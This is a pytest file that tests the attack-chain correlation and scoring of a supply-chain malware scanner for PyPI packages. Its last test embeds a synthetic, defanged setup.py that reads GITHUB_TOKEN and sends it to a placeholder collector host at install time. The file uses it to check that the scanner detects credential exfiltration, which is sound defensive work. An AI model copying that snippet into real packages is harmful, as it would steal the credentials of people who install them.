    (["runtime", "install_time"], True),
    ("import_time", False),
    ("runtime", False),
    ("build_config", False),  # setup.cfg / pyproject.toml values are not executed
    ("data", False),
    ("unknown", False),
    (123, False),
])
def test_capability_pair_needs_an_install_time_label_in_the_shared_file(label, expect_chain):
    boot = "pkg-1.0/pkg/_boot.py"
    findings = [F(Code.ENV_HARVEST, 0.65, boot, line=3, context=label), F(Code.NETWORK_EGRESS, 0.5, boot, line=9)]
    result = correlate(findings)
    assert chain_ids(result) == (["credential_exfiltration"] if expect_chain else [])
    if expect_chain:
        chain = result.chains[0]
        assert chain.install_time is True
        assert chain.confidence == pytest.approx(0.695)  # mean(0.65, 0.5) + 0.07 co-located + 0.05 install-time


def test_location_level_install_context_marks_only_that_file():
    hooks, config = "pkg-1.0/pkg/hooks.py", "pkg-1.0/pkg/config.py"
    env = F(Code.ENV_HARVEST, 0.65, locations=[{"file": hooks, "line": 4, "context": "install-time"},
                                              {"file": config, "line": 8, "context": "runtime"}])
    chain, _ = only_chain(correlate([env, F(Code.NETWORK_EGRESS, 0.5, hooks, line=12)]), "credential_exfiltration")
    assert chain.colocated_file == hooks and chain.install_time is True
    assert correlate([env, F(Code.NETWORK_EGRESS, 0.5, config, line=2)]).chains == []


@pytest.mark.parametrize("label", ["test", "test-file", "tests", "documentation", "docs", "test_fixture"])
def test_non_executing_context_labels_exclude_findings(label):
    loader = F(Code.ENCODED_EXEC, 0.9, "pkg-1.0/pkg/core.py", line=3, severity=Severity.critical, context=label)
    assert correlate([loader]).chains == []
    unlabelled = F(Code.ENCODED_EXEC, 0.9, "pkg-1.0/pkg/core.py", line=3, severity=Severity.critical)
    assert chain_ids(correlate([unlabelled])) == ["obfuscated_loader"]


def test_identity_step_install_label_is_not_install_time_evidence():
    # The dependency-confusion analyzer labels its findings "install-time" because the risk materialises
    # when pip resolves the name; that says nothing about where package code runs.
    collision = F(Code.NAMESPACE_COLLISION, 0.9, severity=Severity.high, context="install-time")
    client = "acme-client-1.0/acme/client.py"
    assert correlate([collision, F(Code.NETWORK_EGRESS, 0.5, client, line=5)]).chains == []

    creds = F(Code.FS_SENSITIVE, 0.9, client, line=7, severity=Severity.high)
    chain, _ = only_chain(correlate([collision, creds]), "dependency_confusion_payload")
    assert chain.install_time is False
    assert chain.confidence == pytest.approx(0.9)  # mean(0.9, 0.9): the label adds no install-time bonus

    weak_collision = F(Code.NAMESPACE_COLLISION, 0.6, context="install-time")
    install = F(Code.INSTALL_HOOK_EXEC, 0.85, "acme-internal-9.9.9/setup.py", severity=Severity.critical)
    assert correlate([weak_collision, install]).chains == []


def test_resolve_technique_and_correlate_tolerate_malformed_finding_attributes():
    step = next(s for t in TEMPLATES if t.chain_id == "persistence_implant" for s in t.steps
                if Code.PERSISTENCE in s.codes_any)
    broken = Finding(Code.PERSISTENCE, Severity.critical, 9.0, "fixture", {"path": "/etc/cron.d/x"}, confidence=0.9)
    object.__setattr__(broken, "attack", None)
    assert engine.resolve_technique(step, broken) == ("persistence", "T1053.003")
    object.__setattr__(broken, "evidence", ["not", "a", "mapping"])
    object.__setattr__(broken, "code", None)
    assert engine.resolve_technique(step, broken) == ("persistence", None)

    persistence = F(Code.PERSISTENCE, 0.9, "pkg/__init__.py", severity=Severity.critical)
    object.__setattr__(persistence, "attack", None)
    result = correlate([persistence, F(Code.NETWORK_EGRESS, 0.5, "pkg/__init__.py")])
    assert chain_ids(result) == ["persistence_implant"]


def test_native_extension_build_script_yields_no_chain():
    # Benign sample modelled on setup.py files of C-extension projects: probes link flags with
    # pkg-config at install time and overrides build_ext. Parsed by the analyzers, never executed.
    files = {
        "fastcodec-2.1/setup.py": (
            "import os\n"
            "import subprocess\n"
            "from setuptools import Extension, setup\n"
            "from setuptools.command.build_ext import build_ext\n\n"
            "def pkg_config(*args):\n"
            "    out = subprocess.check_output(['pkg-config', *args, 'libzstd'], text=True)\n"
            "    return out.split()\n\n"
            "class BuildExt(build_ext):\n"
            "    def build_extensions(self):\n"
            "        if os.environ.get('FASTCODEC_DEBUG'):\n"
            "            for ext in self.extensions:\n"
            "                ext.extra_compile_args.append('-O0')\n"
            "        super().build_extensions()\n\n"
            "setup(name='fastcodec', cmdclass={'build_ext': BuildExt},\n"
            "      ext_modules=[Extension('fastcodec._zstd', ['src/zstd.c'], extra_link_args=pkg_config('--libs'))])\n"
        ),
        "fastcodec-2.1/fastcodec/__init__.py": (
            "from fastcodec._zstd import compress, decompress\n\n"
            "__all__ = ['compress', 'decompress']\n"
        ),
    }
    findings = run_real_analyzers(files, name="fastcodec")
    assert {Code.INSTALL_HOOK_EXEC, Code.SUBPROCESS_EXEC} <= {f.code for f in findings}
    assert correlate(findings).chains == []


# --------------------------------------------------------------------------- orchestrator integration
class _NoModel:
    available = False
    metadata: dict = {}

    def predict(self, features):
        return 0, 0.0


class _Cache:
    def __init__(self) -> None:
        self.store: dict[str, str] = {}

    def get_json(self, key):
        raw = self.store.get(key)
        return json.loads(raw) if raw else None

    def set_json(self, key, value, ttl):
        self.store[key] = json.dumps(value, default=str)


class _Fetcher:
    def __init__(self, ctx: PackageContext | None = None) -> None:
        self.ctx = ctx

    def build_context(self, name, version, options=None):
        return self.ctx if self.ctx is not None else PackageContext(ecosystem="pypi", name=name,
                                                                    version=version or "1.0")


class _Emit(BaseAnalyzer):
    def __init__(self, name, findings):
        self.name = name
        self.version = "9.9.9"
        self._findings = list(findings)

    def analyze(self, ctx):
        return list(self._findings)


@pytest.fixture()
def isolated(monkeypatch):
    monkeypatch.setattr(scoring, "get_model_store", lambda: _NoModel())
    monkeypatch.setattr(orch.settings, "ANALYZER_WORKERS", 2)
    monkeypatch.setattr(orch.settings, "ANALYZER_TIMEOUT_SECONDS", 60)
    monkeypatch.setattr(orch.settings, "SCAN_TIMEOUT_SECONDS", 180)
    monkeypatch.setattr(orch.settings, "SCORE_FUSION", "max")


def test_orchestrator_reports_chain_and_applies_the_critical_chain_floor(isolated):
    # Low-weight, non-critical inputs: none triggers the floor on its own.
    findings = [
        Finding(Code.INSTALL_HOOK_EXEC, Severity.high, 1.0, "fixture", {}, confidence=0.8, location=Location(SETUP)),
        Finding(Code.ENV_HARVEST, Severity.high, 1.0, "fixture", {}, confidence=0.8, location=Location(SETUP)),
        Finding(Code.NETWORK_EGRESS, Severity.low, 1.0, "fixture", {}, confidence=0.5, location=Location(SETUP)),
        Finding(Code.OBFUSCATION, Severity.medium, 1.0, "fixture", {}, confidence=0.8, location=Location(SETUP)),
    ]
    result = Orchestrator(_Fetcher(), analyzers=[_Emit("fixture_analyzer", findings)],
                          cache_backend=_Cache()).analyze("pypi", "demo", "1.0")

    [chain] = result.attack_chains
    assert chain["chain_id"] == "credential_exfiltration" and chain["severity"] == "critical"
    assert chain["confidence"] == pytest.approx(0.93)  # mean(0.8, 0.5) + 2 boosters + co-located + install-time
    [signal] = [s for s in result.signals if s["code"] == Code.ATTACK_CHAIN]
    assert signal["finding_id"] == chain["finding_id"]
    assert signal["analyzer"] == "correlation" and signal["analyzer_version"] == VERSION
    assert signal["related"] == chain["finding_ids"]
    assert set(chain["finding_ids"]) <= {s["finding_id"] for s in result.signals}
    assert signal["location"]["file"] == SETUP and signal["location"]["line"] is None

    floors = result.risk["floors_applied"]
    assert floors and floors[0]["codes"] == [Code.ATTACK_CHAIN] and floors[0]["raised"] is True
    assert result.risk_score == 80 and result.severity == "critical"
    [run] = [r for r in result.analyzer_runs if r["name"] == "correlation"]
    assert run["status"] == "ok" and run["finding_count"] == 1 and run["version"] == VERSION
    json.dumps(asdict(result))


def test_orchestrator_below_floor_confidence_chain_does_not_floor(isolated):
    findings = [F(Code.ENV_HARVEST, 0.65, SETUP, weight=0.5), F(Code.NETWORK_EGRESS, 0.5, SETUP, weight=0.5),
                F(Code.INSTALL_HOOK_EXEC, 0.6, SETUP, weight=0.5)]
    result = Orchestrator(_Fetcher(), analyzers=[_Emit("fixture_analyzer", findings)],
                          cache_backend=_Cache()).analyze("pypi", "demo", "1.0")
    [chain] = result.attack_chains
    assert chain["confidence"] < 0.9
    assert result.risk["floors_applied"] == []


def test_orchestrator_sdk_like_scan_has_no_chains(isolated):
    findings = [F(Code.ENV_HARVEST, 0.65, "cloudsdk/credentials.py"),
                F(Code.NETWORK_EGRESS, 0.5, "cloudsdk/endpoint.py")]
    result = Orchestrator(_Fetcher(), analyzers=[_Emit("fixture_analyzer", findings)],
                          cache_backend=_Cache()).analyze("pypi", "cloudsdk", "1.0")
    assert result.attack_chains == []
    assert Code.ATTACK_CHAIN not in {s["code"] for s in result.signals}
    [run] = [r for r in result.analyzer_runs if r["name"] == "correlation"]
    assert run["status"] == "ok" and run["finding_count"] == 0


def test_orchestrator_with_real_analyzers_on_a_synthetic_stealer(isolated):
    setup_py = (
        "# Synthetic, defanged sample. Parsed, never executed.\n"
        "import os\n"
        "import urllib.request\n"
        "from setuptools import setup\n"
        "token = os.getenv('GITHUB_TOKEN')\n"
        "urllib.request.urlopen('https://collector.example.invalid/t', data=token.encode())\n"
        "setup(name='demo')\n"
    )
    ctx = ctx_with({"demo-1.0/setup.py": setup_py})
    analyzers = [StaticCodeAnalyzer(), InstallScriptAnalyzer(), ObfuscationAnalyzer()]
    result = Orchestrator(_Fetcher(ctx), analyzers=analyzers, cache_backend=_Cache()).analyze("pypi", "demo", "1.0")
    assert "credential_exfiltration" in [c["chain_id"] for c in result.attack_chains]
    chain = next(c for c in result.attack_chains if c["chain_id"] == "credential_exfiltration")
    assert chain["colocated_file"] == "demo-1.0/setup.py" and chain["context"]["install_time"] is True
    assert chain["finding_id"] in {s["finding_id"] for s in result.signals}
